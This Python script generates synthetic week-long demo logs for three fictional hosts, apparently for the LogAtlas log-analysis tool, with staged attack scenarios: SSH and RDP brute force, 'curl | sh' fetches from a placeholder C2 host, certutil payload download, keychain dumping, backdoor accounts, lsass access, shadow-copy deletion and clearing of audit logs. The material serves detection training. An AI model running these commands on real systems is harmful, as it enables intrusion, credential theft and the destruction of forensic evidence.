#!/usr/bin/env python3
"""Демо-данные для LogAtlas: неделя правдоподобной активности трёх вымышленных хостов
со встроенным сценарием атаки. Реальных данных здесь нет: имена хостов и пользователей
придуманы, внешние адреса взяты из документационных диапазонов RFC 5737.

    python3 scripts/make-demo.py [папка]      # по умолчанию ./demo

Создаёт macos-demo.tar.gz, windows-demo.zip и linux-demo.tar.gz — их можно
сразу загрузить в LogAtlas.
"""
from __future__ import annotations

import calendar
import io
import json
import os
import random
import sys
import tarfile
import zipfile
from datetime import datetime, timedelta

R = random.Random(42)
START = datetime(2026, 9, 28)          # понедельник
DAYS = 7
TZ = timedelta(hours=3)                # часы хостов: UTC+03:00

ATTACKER = "203.0.113.45"
ATTACKER_WIN = "203.0.113.77"
ATTACKER_LIN = "203.0.113.99"
C2 = "198.51.100.23"


def workday(d):
    return d.weekday() < 5


def rand_time(day, h0, h1):
    return day + timedelta(seconds=R.uniform(h0 * 3600, h1 * 3600))


def pack_tar(path, files):
    with tarfile.open(path, "w:gz") as tf:
        for name, data in files.items():
            b = data.encode("utf-8")
            ti = tarfile.TarInfo(name)
            ti.size = len(b)
            ti.mtime = calendar.timegm((START + timedelta(days=DAYS) - TZ).timetuple())
            tf.addfile(ti, io.BytesIO(b))


# =============================================================================
# macOS: mbp-design-07, пользователь anna
# =============================================================================
APPS = [("com.apple.Safari", "Safari"), ("com.tinyspeck.slackmacgap", "Slack"), ("com.figma.Desktop", "Figma"),
        ("com.apple.mail", "Mail"), ("com.microsoft.VSCode", "Code"), ("ru.keepcoder.Telegram", "Telegram"),
        ("com.apple.Terminal", "Terminal"), ("us.zoom.xos", "zoom.us"), ("com.apple.finder", "Finder")]
NOISE = [("/usr/sbin/mDNSResponder", "com.apple.mDNSResponder", "Resolver", "[R{n}] getaddrinfo stop -- hostname: <private>, client pid: {p}"),
         ("/usr/libexec/trustd", "com.apple.securityd", "trust", "cert[0]: SubjectCommonName =(leaf)[]> 0"),
         ("/usr/libexec/runningboardd", "com.apple.runningboard", "process", "Acquiring assertion targeting [app<application.com.apple.Safari>:{p}]"),
         ("/usr/libexec/airportd", "com.apple.WiFiManager", "", "__WiFiDeviceManagerScanPreviousNetworkChannel: scanning"),
         ("/System/Library/CoreServices/WindowServer", "com.apple.WindowServer", "default", "Display 1 changed brightness"),
         ("/usr/sbin/bluetoothd", "com.apple.bluetooth", "Server.LE", "LE scan started"),
         ("/kernel", "", "", "AppleCLPC: perf state {n}")]


def unified_line(t, proc_path, msg, sub="", cat="", mtype="Default", pid=None, uid=501):
    return json.dumps({
        "timestamp": (t).strftime("%Y-%m-%d %H:%M:%S.%f") + "+0300", "messageType": mtype, "eventType": "logEvent",
        "processImagePath": proc_path, "processID": pid or R.randint(100, 9000), "userID": uid,
        "subsystem": sub, "category": cat, "eventMessage": msg}, ensure_ascii=False)


def make_macos(out):
    U, SYS, INST, PM, LD, WIFI = [], [], [], [], [], []
    host = "mbp-design-07"

    def syslog(t, proc, msg, pid=None):
        SYS.append((t, f"{t.strftime('%b %e %H:%M:%S')} {host} {proc}[{pid or R.randint(100, 60000)}]: {msg}"))

    def pm(t, dom, msg, dur=""):
        PM.append((t, f"{t.strftime('%Y-%m-%d %H:%M:%S')} +0300 {dom:<20}\t{msg:<75}\t{dur}"))

    def ld(t, dom, msg, lvl="Notice"):
        LD.append((t, f"{t.strftime('%Y-%m-%d %H:%M:%S.%f')} ({dom}) <{lvl}>: {msg}"))

    boot = START + timedelta(hours=8, minutes=52)
    syslog(boot, "bootlog", "BOOT_TIME 1790578320 0", 0)
    pm(boot, "Start", "powerd process is started")
    ld(boot, "system", "hello, launchd")
    for d in range(DAYS):
        day = START + timedelta(days=d)
        work = workday(day)
        # шум в течение суток — гуще в рабочие часы
        for hh in range(24):
            busy = work and 9 <= hh < 19
            n = R.randint(260, 420) if busy else R.randint(15, 40)
            for _ in range(n):
                path, sub, cat, tmpl = R.choice(NOISE)
                t = day + timedelta(hours=hh, seconds=R.uniform(0, 3600))
                U.append((t, unified_line(t, path, tmpl.format(n=R.randint(1, 900), p=R.randint(300, 9000)), sub, cat,
                                          "Error" if R.random() < 0.03 else "Default")))
        # сторонние службы
        for hh in range(0, 24, 2):
            t = day + timedelta(hours=hh, minutes=R.randint(0, 59))
            ld(t, "system/com.google.keystone.daemon", f"xpcproxy spawned with pid {R.randint(1000, 60000)}")
        if not work:
            pm(day + timedelta(hours=11), "Wake", "Wake from Deep Idle [CDNVA] : due to UserActivity Assertion")
            pm(day + timedelta(hours=11, minutes=40), "Sleep", "Entering Sleep state due to 'Idle Sleep'")
            continue
        unlock = day + timedelta(hours=9, minutes=R.randint(0, 25))
        pm(unlock - timedelta(minutes=1), "Wake", "Wake from Deep Idle [CDNVA] : due to EC.LidOpen/Lid Open")
        pm(unlock, "Notification", "Display is turned on")
        U.append((unlock, unified_line(unlock, "/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow",
                                       "-[SessionAgentNotificationCenter sendBSDNotification:withOptions:] | sending BSD notification: com.apple.sessionagent.screenIsUnlocked",
                                       "com.apple.loginwindow.logging", "Standard")))
        for lock_h, back_h in ((13.0, 14.0), (18.5, None)):
            tl = day + timedelta(hours=lock_h, minutes=R.randint(0, 20))
            U.append((tl, unified_line(tl, "/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow",
                                       "-[SessionAgentNotificationCenter sendBSDNotification:withOptions:] | sending BSD notification: com.apple.sessionagent.screenIsLocked",
                                       "com.apple.loginwindow.logging", "Standard")))
            pm(tl + timedelta(minutes=2), "Notification", "Display is turned off")
            if back_h:
                tb = day + timedelta(hours=back_h, minutes=R.randint(0, 25))
                U.append((tb, unified_line(tb, "/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow",
                                           "-[SessionAgentNotificationCenter sendBSDNotification:withOptions:] | sending BSD notification: com.apple.sessionagent.screenIsUnlocked",
                                           "com.apple.loginwindow.logging", "Standard")))
                pm(tb, "Notification", "Display is turned on")
            else:
                pm(tl + timedelta(minutes=25), "Sleep", "Entering Sleep state due to 'Idle Sleep'")
        for _ in range(R.randint(14, 26)):
            bid, name = R.choice(APPS)
            t = rand_time(day, 9.2, 18.4)
            pid = R.randint(2000, 60000)
            U.append((t, unified_line(t, "/usr/libexec/runningboardd",
                                      f"Now tracking process: [app<application.{bid}.{R.randint(10000, 99999)}.{R.randint(10000, 99999)}(501)>:{pid}]",
                                      "com.apple.runningboard", "process")))
        for _ in range(R.randint(4, 8)):
            t = rand_time(day, 9.5, 18)
            pm(t, "Assertions", f"PID 412(WindowServer) Created UserIsActive \"com.apple.iohideventsystem.queue.tickle\" 00:00:00  id:0x0x{R.randint(10**8, 10**9):x}")
        if d in (1, 3):  # видеозвонки
            t = rand_time(day, 11, 12)
            for svc, val in (("Microphone", 2), ("Camera", 2)):
                mid = f"{R.randint(100, 900)}.{R.randint(1, 99)}"
                U.append((t, unified_line(t, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd",
                                          f"AUTHREQ_CTX: msgID={mid}, function=TCCAccessRequest, service=kTCCService{svc}, preflight=no, query=1, client_dict=(null), daemon_dict=<private>", "com.apple.TCC", "access")))
                U.append((t, unified_line(t, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd",
                                          f"AUTHREQ_ATTRIBUTION: msgID={mid}, attribution={{accessing={{TCCDProcess: identifier=us.zoom.xos, pid=4410, auid=501, euid=501, binary_path=/Applications/zoom.us.app/Contents/MacOS/zoom.us}}, }},", "com.apple.TCC", "access")))
                U.append((t, unified_line(t, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd",
                                          f"AUTHREQ_RESULT: msgID={mid}, authValue={val}, authReason=2, authVersion=1, desired_auth=0, error=(null),", "com.apple.TCC", "access")))
        if d == 2:  # установка ПО
            t = day + timedelta(hours=15, minutes=12)
            INST.append((t, f"{t.strftime('%Y-%m-%d %H:%M:%S')}+03 {host} Installer[5120]: Product archive /Users/anna/Downloads/Figma-125.4.pkg trustLevel=350"))
            INST.append((t + timedelta(seconds=40), f"{(t + timedelta(seconds=40)).strftime('%Y-%m-%d %H:%M:%S')}+03 {host} installd[812]: Installed \"Figma\" (125.4)"))
            t2 = day + timedelta(hours=16, minutes=3)
            for nm, ver in (("XProtectPayloads", "158"), ("XProtectPlistConfigData", "5361")):
                INST.append((t2, f"{t2.strftime('%Y-%m-%d %H:%M:%S')}+03 {host} system_installd[790]: Installed \"{nm}\" ({ver})"))
        if d == 3:  # флешка
            t = day + timedelta(hours=14, minutes=37)
            U.append((t, unified_line(t, "/usr/sbin/diskarbitrationd", "<private> [disk4s1]:  mounted at /Volumes/KINGSTON", "com.apple.DiskArbitration.diskarbitrationd", "default")))
            pm(t, "Assertions", "PID 341(powerd) Created ExternalMedia \"com.apple.powermanagement.externalmediamounted\" 00:00:00  id:0x0x1")
        if d == 1:
            t = day + timedelta(hours=10, minutes=5)
            syslog(t, "sudo", "    anna : TTY=ttys001 ; PWD=/Users/anna ; USER=root ; COMMAND=/usr/sbin/softwareupdate -l")
            WIFI.append((t, f"{t.strftime('%a %b %e %H:%M:%S.%f')[:-3]} [airport]/412 @[1022.1] (configdIODriverInterface.m:4763) dq:'com.apple.main-thread'/tid[0x11e1] utun3: KEV_DL_IF_ATTACHED"))
        tip = day + timedelta(hours=9, minutes=1)
        WIFI.append((tip, f"{tip.strftime('%a %b %e %H:%M:%S.%f')[:-3]} [airport]/412 @[812.4] (airportProcessCommand.m:520) dq:'com.apple.airportd.server.command.q'/tid[0x1b8666] IP Address: 10.40.2.{R.randint(20, 90)}"))

    # --- сценарий: ночь с пятницы на субботу ---------------------------------
    t0 = START + timedelta(days=4, hours=26, minutes=14)   # сб 02:14
    pm(t0 - timedelta(minutes=1), "DarkWake", "DarkWake from Deep Idle [CDN] : due to NUB.SPMI0.SW3 RTC/Maintenance")
    for i in range(9):
        t = t0 + timedelta(seconds=i * 7)
        U.append((t, unified_line(t, "/usr/libexec/sshd-session", f"Failed password for anna from {ATTACKER} port {R.randint(40000, 60000)} ssh2", "", "", "Default", 7701 + i, 0)))
    t = t0 + timedelta(minutes=2)
    U.append((t, unified_line(t, "/usr/libexec/sshd-session", f"Accepted password for anna from {ATTACKER} port 51022 ssh2", "", "", "Default", 7790, 0)))
    syslog(t, "sshd-session", "anna [postauth][7790]: USER_PROCESS: 7791 ttys003")
    cmds = ["/bin/bash -c curl -fsSL http://198.51.100.23/i.sh | sh",
            "/usr/bin/xattr -d com.apple.quarantine /Users/Shared/.updater",
            "/bin/launchctl load -w /Library/LaunchDaemons/com.apple.updated.helper.plist",
            "/usr/bin/security dump-keychain -d /Users/anna/Library/Keychains/login.keychain-db"]
    for i, c in enumerate(cmds):
        tc = t + timedelta(minutes=1 + i)
        syslog(tc, "sudo", f"    anna : TTY=ttys003 ; PWD=/Users/anna ; USER=root ; COMMAND={c}")
    tp = t + timedelta(minutes=3, seconds=5)
    ld(tp, "system", "Bootstrapped service from path = /Library/LaunchDaemons/com.apple.updated.helper.plist")
    for k in range(30):
        tk = tp + timedelta(minutes=2 * k + 1)
        ld(tk, "system/com.apple.updated.helper", f"xpcproxy spawned with pid {9100 + k}")
    mid = "611.7"
    for line in (f"AUTHREQ_CTX: msgID={mid}, function=TCCAccessRequest, service=kTCCServiceSystemPolicyAllFiles, preflight=no, query=1, client_dict=(null), daemon_dict=<private>",
                 f"AUTHREQ_ATTRIBUTION: msgID={mid}, attribution={{accessing={{TCCDProcess: identifier=updater, pid=9100, auid=0, euid=0, binary_path=/Users/Shared/.updater}}, }},",
                 f"AUTHREQ_RESULT: msgID={mid}, authValue=0, authReason=5, authVersion=1, desired_auth=0, error=(null),"):
        U.append((tp + timedelta(seconds=20), unified_line(tp + timedelta(seconds=20), "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", line, "com.apple.TCC", "access", uid=0)))
    syslog(t + timedelta(minutes=9), "sshd-session", "anna [postauth][7790]: DEAD_PROCESS: 7791 ttys003")
    shut = START + timedelta(days=6, hours=20, minutes=11)
    syslog(shut, "shutdown", "SHUTDOWN_TIME: 1791133860 0", 1)
    ld(shut, "system/com.apple.kernelmanagerd", "exited due to exit(0) during system shutdown, ran for 1000ms")

    def dump(items):
        return "\n".join(x for _, x in sorted(items, key=lambda a: a[0])) + "\n"
    pack_tar(os.path.join(out, "macos-demo.tar.gz"), {
        "unified.ndjson": dump(U), "var_log/system.log": dump(SYS), "var_log/install.log": dump(INST),
        "pmset.log": "PM ASL data store: /var/log/powermanagement\n" + dump(PM),
        "var_log/com.apple.xpc.launchd/launchd.log": dump(LD), "var_log/wifi.log": dump(WIFI)})
    return len(U) + len(SYS) + len(INST) + len(PM) + len(LD) + len(WIFI)


# =============================================================================
# Windows: WS-FIN-12, CORP\m.ivanova
# =============================================================================
NS = "http://schemas.microsoft.com/win/2004/08/events/event"
SEC = "Microsoft-Windows-Security-Auditing"
SYSMON = "Microsoft-Windows-Sysmon"


def win_ev(t, eid, prov, ch, data, level=0, comp="WS-FIN-12.corp.example"):
    d = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    st = (t - TZ).strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"
    return (t, f'<Event xmlns="{NS}"><System><Provider Name="{prov}"/><EventID>{eid}</EventID><Version>2</Version>'
               f'<Level>{level}</Level><TimeCreated SystemTime="{st}"/><EventRecordID>{R.randint(10 ** 5, 10 ** 7)}</EventRecordID>'
               f'<Execution ProcessID="{R.randint(400, 9000)}" ThreadID="{R.randint(100, 9000)}"/><Channel>{ch}</Channel>'
               f'<Computer>{comp}</Computer></System><EventData>{d}</EventData></Event>')


def make_windows(out):
    E = []
    U = {"TargetUserName": "m.ivanova", "TargetDomainName": "CORP"}
    S = {"SubjectUserName": "m.ivanova", "SubjectDomainName": "CORP"}
    apps = ["C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Users\\m.ivanova\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
            "C:\\Program Files\\1cv8\\8.3.24\\bin\\1cv8.exe", "C:\\Windows\\explorer.exe"]
    for d in range(DAYS):
        day = START + timedelta(days=d)
        for hh in range(24):  # фоновые входы служб и компьютера
            for _ in range(R.randint(3, 8)):
                E.append(win_ev(day + timedelta(hours=hh, seconds=R.uniform(0, 3600)), 4624, SEC, "Security",
                                {"TargetUserName": "WS-FIN-12$", "TargetDomainName": "CORP", "LogonType": "5", "IpAddress": "-"}))
        if not workday(day):
            continue
        on = day + timedelta(hours=8, minutes=R.randint(35, 55))
        E.append(win_ev(on, 6005, "EventLog", "System", {}))
        E.append(win_ev(on + timedelta(minutes=2), 4624, SEC, "Security", {**U, "LogonType": "2", "IpAddress": "127.0.0.1",
                                                                          "ProcessName": "C:\\Windows\\System32\\svchost.exe"}))
        for _ in range(R.randint(20, 40)):
            img = R.choice(apps)
            E.append(win_ev(rand_time(day, 9, 18), 4688, SEC, "Security", {**S, "NewProcessName": img, "CommandLine": f"\"{img}\""}))
        for _ in range(R.randint(2, 6)):
            E.append(win_ev(rand_time(day, 9, 18), 4624, SEC, "Security", {**U, "LogonType": "3", "IpAddress": "10.10.0.12"}))
        for a, b in ((12.9, 13.8), (15.5, 15.7)):
            E.append(win_ev(rand_time(day, a, a + .05), 4800, SEC, "Security", U))
            E.append(win_ev(rand_time(day, b, b + .05), 4801, SEC, "Security", U))
        off = day + timedelta(hours=18, minutes=R.randint(5, 40))
        E.append(win_ev(off, 4647, SEC, "Security", U))
        E.append(win_ev(off + timedelta(minutes=1), 6006, "EventLog", "System", {}))
        if d == 1:
            E.append(win_ev(day + timedelta(hours=11, minutes=20), 11707, "MsiInstaller", "Application", {"param1": "Product: 7-Zip 24.08 (x64) -- Installation completed successfully."}))
        if d == 2:
            E.append(win_ev(day + timedelta(hours=14, minutes=2), 6416, SEC, "Security", {"DeviceDescription": "USB Mass Storage Device (SanDisk Ultra)", "DeviceId": "USB\\VID_0781"}))

    # --- сценарий: ночь на четверг, подбор пароля по RDP ----------------------
    t0 = START + timedelta(days=3, hours=2, minutes=41)
    E.append(win_ev(t0 - timedelta(minutes=3), 6005, "EventLog", "System", {}))
    for i in range(42):
        E.append(win_ev(t0 + timedelta(seconds=i * 4), 4625, SEC, "Security",
                        {"TargetUserName": R.choice(["administrator", "admin", "m.ivanova", "buh"]), "TargetDomainName": "WS-FIN-12",
                         "LogonType": "10", "IpAddress": ATTACKER_WIN, "Status": "0xc000006d"}))
    t = t0 + timedelta(minutes=4)
    adm = {"SubjectUserName": "administrator", "SubjectDomainName": "WS-FIN-12"}
    E += [win_ev(t, 4624, SEC, "Security", {"TargetUserName": "administrator", "TargetDomainName": "WS-FIN-12", "LogonType": "10", "IpAddress": ATTACKER_WIN}),
          win_ev(t + timedelta(seconds=1), 4672, SEC, "Security", adm),
          win_ev(t + timedelta(minutes=1), 1, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "User": "WS-FIN-12\\administrator", "ParentImage": "C:\\Windows\\explorer.exe"}),
          win_ev(t + timedelta(minutes=2), 1, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": f"certutil -urlcache -split -f http://{C2}/svc.exe C:\\ProgramData\\svc.exe", "User": "WS-FIN-12\\administrator"}),
          win_ev(t + timedelta(minutes=2, seconds=30), 3, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\ProgramData\\svc.exe", "DestinationIp": C2, "DestinationPort": "443", "User": "WS-FIN-12\\administrator"}),
          win_ev(t + timedelta(minutes=3), 4720, SEC, "Security", {"TargetUserName": "support_svc", "TargetDomainName": "WS-FIN-12", **adm}),
          win_ev(t + timedelta(minutes=3, seconds=20), 4732, SEC, "Security", {"MemberName": "-", "MemberSid": "S-1-5-21-4000-1013", "TargetUserName": "Administrators", "TargetDomainName": "Builtin", **adm}),
          win_ev(t + timedelta(minutes=4), 7045, "Service Control Manager", "System", {"ServiceName": "WinTelemetrySvc", "ImagePath": "C:\\ProgramData\\svc.exe", "StartType": "auto start", "AccountName": "LocalSystem"}),
          win_ev(t + timedelta(minutes=5), 4698, SEC, "Security", {"TaskName": "\\Microsoft\\Windows\\Maintenance\\SysCheck", **adm}),
          win_ev(t + timedelta(minutes=5, seconds=30), 13, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\ProgramData\\svc.exe", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SysCheck", "User": "WS-FIN-12\\administrator"}),
          win_ev(t + timedelta(minutes=6), 10, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"SourceImage": "C:\\ProgramData\\svc.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010", "User": "WS-FIN-12\\administrator"}),
          win_ev(t + timedelta(minutes=6, seconds=10), 1116, "Microsoft-Windows-Windows Defender", "Microsoft-Windows-Windows Defender/Operational", {"Threat Name": "HackTool:Win32/Mimikatz.D", "Path": "file:_C:\\ProgramData\\m64.exe", "Detection User": "WS-FIN-12\\administrator"}, level=3),
          win_ev(t + timedelta(minutes=7), 1, SYSMON, "Microsoft-Windows-Sysmon/Operational", {"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all /quiet", "User": "WS-FIN-12\\administrator"}),
          win_ev(t + timedelta(minutes=9), 1102, "Microsoft-Windows-Eventlog", "Security", {"SubjectUserName": "administrator"})]
    E.sort(key=lambda x: x[0])
    sec = [x for _, x in E if "<Channel>Security</Channel>" in x]
    rest = [x for _, x in E if "<Channel>Security</Channel>" not in x]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("Security.xml", "\n".join(sec))
        z.writestr("System_Sysmon_Defender.xml", "\n".join(rest))
    open(os.path.join(out, "windows-demo.zip"), "wb").write(buf.getvalue())
    return len(E)


# =============================================================================
# Linux: srv-app-02 (auditd + secure + journald), администратор deploy
# =============================================================================
def make_linux(out):
    A, SECL, J = [], [], []
    serial = [5000]
    host = "srv-app-02"

    def epoch(t):
        return calendar.timegm((t - TZ).timetuple()) + t.microsecond / 1e6

    def au(t, recs):
        serial[0] += 1
        ts = f"{epoch(t):.3f}"
        for typ, body, enr in recs:
            A.append((t, f"type={typ} msg=audit({ts}:{serial[0]}): {body}" + (f"\x1d{enr}" if enr else "")))

    def sec(t, proc, msg):
        SECL.append((t, f"{t.strftime('%b %e %H:%M:%S')} {host} {proc}[{R.randint(900, 60000)}]: {msg}"))

    def jr(t, ident, msg, prio=6):
        J.append((t, json.dumps({"__REALTIME_TIMESTAMP": str(int(epoch(t) * 1e6)), "_HOSTNAME": host,
                                 "SYSLOG_IDENTIFIER": ident, "PRIORITY": str(prio), "MESSAGE": msg})))

    def execve(t, user, uid, args, key="exec"):
        hexa = lambda s: s.encode().hex().upper() if (" " in s or "|" in s) else f'"{s}"'
        body = " ".join(f"a{i}={hexa(a)}" for i, a in enumerate(args))
        au(t, [("SYSCALL", f'arch=c00000b7 syscall=221 success=yes exit=0 items=2 ppid={R.randint(900, 9000)} pid={R.randint(900, 60000)} auid={uid} uid={uid} tty=pts0 ses=12 comm="{os.path.basename(args[0])}" exe="/usr/bin/{os.path.basename(args[0])}" key="{key}"',
                f'ARCH=aarch64 SYSCALL=execve AUID="{user}" UID="{user}"'),
               ("EXECVE", f"argc={len(args)} {body}", None)])

    au(START + timedelta(hours=0, minutes=1), [("SYSTEM_BOOT", "pid=1 uid=0 auid=4294967295 ses=4294967295 msg=' comm=\"systemd-update-utmp\" exe=\"/usr/lib/systemd/systemd-update-utmp\" res=success'", None)])
    au(START + timedelta(minutes=1, seconds=5), [("DAEMON_START", "op=start ver=3.1.2 format=enriched kernel=6.6.31 auid=4294967295 pid=640 res=success", None)])
    for d in range(DAYS):
        day = START + timedelta(days=d)
        # фоновые попытки подбора из интернета
        for _ in range(R.randint(25, 60)):
            t = rand_time(day, 0, 24)
            ip = f"198.51.100.{R.randint(2, 250)}"
            u = R.choice(["admin", "test", "oracle", "ubuntu", "git", "postgres"])
            sec(t, "sshd", f"Invalid user {u} from {ip} port {R.randint(30000, 65000)}")
        for hh in range(24):  # cron
            t = day + timedelta(hours=hh, minutes=5)
            sec(t, "CROND", "(root) CMD (/usr/local/bin/backup-db.sh)")
            execve(t, "root", 0, ["/bin/sh", "-c", "/usr/local/bin/backup-db.sh"], "cron_exec")
        if not workday(day):
            continue
        for k in range(R.randint(1, 3)):
            t = rand_time(day, 9.5, 17.5)
            au(t, [("USER_LOGIN", "pid=2300 uid=0 auid=1000 ses=12 msg='op=login id=1000 exe=\"/usr/sbin/sshd\" hostname=10.20.0.5 addr=10.20.0.5 terminal=/dev/pts/0 res=success'", 'UID="root" AUID="deploy" ID="deploy"')])
            sec(t, "sshd", f"Accepted publickey for deploy from 10.20.0.5 port {R.randint(40000, 60000)} ssh2: ED25519 SHA256:k3yF1ngerpr1nt")
            for c in (["git", "-C", "/srv/app", "pull"], ["systemctl", "status", "app"], ["journalctl", "-u", "app", "-n", "50"]):
                execve(t + timedelta(seconds=R.randint(10, 300)), "deploy", 1000, c)
            ts = t + timedelta(minutes=6)
            sec(ts, "sudo", "  deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app")
            au(ts, [("USER_CMD", "pid=2400 uid=1000 auid=1000 ses=12 msg='cwd=\"/srv/app\" cmd=" + "systemctl restart app".encode().hex().upper() + " exe=\"/usr/bin/sudo\" terminal=pts/0 res=success'", 'UID="deploy" AUID="deploy"')])
            au(ts + timedelta(seconds=2), [("SERVICE_START", "pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=app comm=\"systemd\" exe=\"/usr/lib/systemd/systemd\" res=success'", None)])
        if d == 2:
            t = day + timedelta(hours=11, minutes=48)
            jr(t, "kernel", "usb 1-1.3: New USB device found, idVendor=0951, idProduct=1666, bcdDevice= 1.10")
            jr(t + timedelta(seconds=1), "kernel", "usb 1-1.3: Product: DataTraveler 3.0")
            sec(t + timedelta(minutes=3), "dnf", "Installed: htop-3.3.0-1.red80.aarch64")

    # --- сценарий: суббота 03:05, вход по украденному ключу ------------------
    t = START + timedelta(days=5, hours=3, minutes=5)
    au(t, [("USER_LOGIN", f"pid=7300 uid=0 auid=1000 ses=31 msg='op=login id=1000 exe=\"/usr/sbin/sshd\" hostname={ATTACKER_LIN} addr={ATTACKER_LIN} terminal=/dev/pts/1 res=success'", 'UID="root" AUID="deploy" ID="deploy"')])
    sec(t, "sshd", f"Accepted publickey for deploy from {ATTACKER_LIN} port 50211 ssh2: ED25519 SHA256:k3yF1ngerpr1nt")
    execve(t + timedelta(minutes=1), "deploy", 1000, ["bash", "-c", f"curl -s http://{C2}/x.sh | sh"])
    ts = t + timedelta(minutes=2)
    sec(ts, "sudo", "  deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysmaint")
    au(ts, [("USER_CMD", "pid=7400 uid=1000 auid=1000 ses=31 msg='cwd=\"/tmp\" cmd=" + "useradd -m -s /bin/bash sysmaint".encode().hex().upper() + " exe=\"/usr/bin/sudo\" terminal=pts/1 res=success'", 'UID="deploy" AUID="deploy"')])
    au(ts + timedelta(seconds=1), [("ADD_USER", "pid=7401 uid=0 auid=1000 ses=31 msg='op=add-user acct=\"sysmaint\" exe=\"/usr/sbin/useradd\" hostname=srv-app-02 addr=? terminal=pts/1 res=success'", 'UID="root" AUID="deploy"')])
    sec(ts + timedelta(seconds=1), "useradd", "new user: name=sysmaint, UID=1002, GID=1002, home=/home/sysmaint, shell=/bin/bash")
    sec(ts + timedelta(seconds=20), "usermod", "add 'sysmaint' to group 'wheel'")
    tc = ts + timedelta(minutes=1)
    au(tc, [("SYSCALL", 'arch=c00000b7 syscall=56 success=yes exit=3 items=2 ppid=7300 pid=7420 auid=1000 uid=0 euid=0 tty=pts1 ses=31 comm="tee" exe="/usr/bin/tee" key="cron"', 'SYSCALL=openat AUID="deploy" UID="root"'),
            ("PATH", 'item=0 name="/etc/cron.d/" inode=1 nametype=PARENT', None), ("PATH", 'item=1 name="/etc/cron.d/sysupdate" inode=2 nametype=CREATE', None)])
    au(tc + timedelta(seconds=30), [("SYSCALL", 'arch=c00000b7 syscall=203 success=yes exit=0 items=0 ppid=1 pid=7500 auid=1000 uid=0 tty=(none) ses=31 comm="sh" exe="/usr/bin/bash" key="net"', 'SYSCALL=connect'),
                                    ("SOCKADDR", "saddr=0200115CC6336417" + "0" * 16, None)])
    execve(tc + timedelta(minutes=1), "deploy", 0, ["auditctl", "-D"])
    au(tc + timedelta(minutes=1, seconds=1), [("CONFIG_CHANGE", 'auid=1000 ses=31 op=remove_rule key="exec" list=4 res=1', None)])
    au(tc + timedelta(minutes=2), [("DAEMON_END", "op=terminate auid=1000 pid=7600 res=success", None)])
    jr(tc + timedelta(minutes=2), "systemd", "Stopped auditd.service - Security Auditing Service.")

    def dump(items):
        return "\n".join(x for _, x in sorted(items, key=lambda a: a[0])) + "\n"
    pack_tar(os.path.join(out, "linux-demo.tar.gz"), {"var/log/audit/audit.log": dump(A), "var/log/secure": dump(SECL),
                                                      "journal.json": dump(J)})
    return len(A) + len(SECL) + len(J)


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "demo"
    os.makedirs(out, exist_ok=True)
    for name, fn in (("macOS", make_macos), ("Windows", make_windows), ("Linux", make_linux)):
        print(f"{name}: {fn(out)} записей")
    print(f"Готово: {os.path.abspath(out)}")
